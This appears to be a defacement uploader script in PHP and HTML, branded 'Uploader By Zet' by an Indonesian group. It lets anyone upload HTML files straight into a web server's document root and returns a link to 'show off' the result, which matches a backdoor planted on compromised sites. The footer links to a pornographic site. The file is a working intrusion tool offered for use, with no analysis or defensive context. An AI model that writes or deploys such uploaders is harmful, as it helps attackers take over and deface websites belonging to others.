<!doctype html>
<link rel="icon" type="image/png" href="https://i.ibb.co/CMYgpZW/IMG-20200528-WA0167.jpg">
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="author" content="Copyright @2020"> <!-- Copyright @2020 -->
<link rel="icon" type="image/png" href="https://i.ibb.co/CMYgpZW/IMG-20200528-WA0167.jpg">
    <meta name="description" content="Uploader SCS">
    <meta name="theme-color" content="#000">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
<link href="https://fonts.googleapis.com/css?family=Girassol&display=swap" rel="stylesheet">
    <link rel="icon" href="https://i.ibb.co/CMYgpZW/IMG-20200528-WA0167.jpg" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
<link rel="icon" type="image/png" href="https://i.ibb.co/CMYgpZW/IMG-20200528-WA0167.jpg">
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
    <title>Uploader By Zet</title>
    <style>
html,body,.container{
            background: url(https://i.ibb.co/CMYgpZW/IMG-20200528-WA0167.jpg) no-repeat center center/cover;
            position: fixed;
            margin: auto;
            height: 75%;
            top: 0; bottom: 0; left: 0; right:0;
            font-family: 'Girassol';
            color: #fff;
        }
    	#ico{width:200px;height:150px;}
    </style>
  </head>
  <body>
<iframe widllth="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="#"></iframe>
    <div class="container text-center mx-auto">
    	<h2 class="mt-3"><font color="cyan">Akses By Zet<br>zildaneundan.eu5.org</font></h2>
<br>
<br>
<h4 class="mt-3"><font color="cyan">Uploader : .jpg .html .png .gif</font></h4><br>
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="Pilih File" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Sabar Gay(n)"><font color="cyan">Klik Me</font></button>
    	</form><hr>

<?php
	$server   = $_SERVER['DOCUMENT_ROOT'];
	$namaFile = $_FILES['randsx']['name'];
	$getcwd   = "$server/$namaFile";
	$typeExt  = pathinfo($namaFile, PATHINFO_EXTENSION);
if(isset($_POST['upload'])){
if($namaFile !== ''){
	if(is_writable($server)){
		if($typeExt === 'html'){
			if($namaFile !== 'index.html'){
				if(@copy($_FILES['randsx']['tmp_name'], $getcwd)){
					$akses = 'http://'.$_SERVER['HTTP_HOST'].'/';
					echo '<script>swal("Berhasil", "Silahkan Show off sayang😙", "success")</script>';
					echo '<a href="'.$akses.$namaFile.'" target="_blank">Hasil?? klik me</a>';
				}else{
					echo '<script>swal("Wkwk Gagal", "Faktor Muka burik", "error"</script>';
				}
			}else{
				echo '<script>swal("Jangan Ngindex ", "Sayang😙", "error")</script>';
			}
		}else{
			echo '<script>swal("Harus", "File Ekstensi Harus HTML Sayang😙", "info")</script>';
			}
		}else{
			echo '<script>swal("Gagal beb:l", "Server Not Support", "error")</script>';
		}
	}else{
		echo '<script>swal("Hahh??", "Mau upload apaan??", "info")</script>';
	}
}
?>
<footer>
	<body dir="ltr" alink="#00FFFF" background="transparan" bgcolor="#000000" link="grey" text="grey" vlink="white">
&copy; 2020 - <font color="#00FFFF"><a href="https://xnxx.com">Cowok Tersakiti Team</font>
</footer>
    </div>
		<script>
			document.getElementById('FileSel').onchange = function()
			{
				document.getElementById('previews').value = this.value;
			};
			
			$('.btn').on('click', function(){
				var $this = $(this);
				$this.button('loading');
			});
			
		</script>
  </body>
</html>